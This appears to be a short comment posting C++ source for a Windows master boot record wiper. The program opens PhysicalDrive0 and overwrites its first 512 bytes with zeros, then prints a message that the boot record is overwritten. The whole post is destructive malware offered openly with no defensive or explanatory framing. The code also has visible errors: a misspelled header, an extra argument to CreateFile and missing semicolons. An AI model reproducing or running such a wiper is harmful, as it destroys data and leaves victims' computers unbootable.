
Kudrin Kudrin
1 năm trước
#include <Window.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512
int main()
{
    DWORD write;
    char mbrData[512];
    
    ZeroMemory(&mbrData, (sizeof mbrData));
    
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
        // or CreateFileA
         ,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE
         ,NULL,OPEN_EXISTING,0,NULL,NULL) 
         if(WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE){
            cout << "Master Boot Record is over written!" << endl;
            Sleep(5000)
            ExitProcess(0)
         }
         else{  
            cout << "Fail";
            Sleep(5000);
         }     
     CloseHandle(MasterBootRecord);
     
     return EXIT_SUCCESS; 
}﻿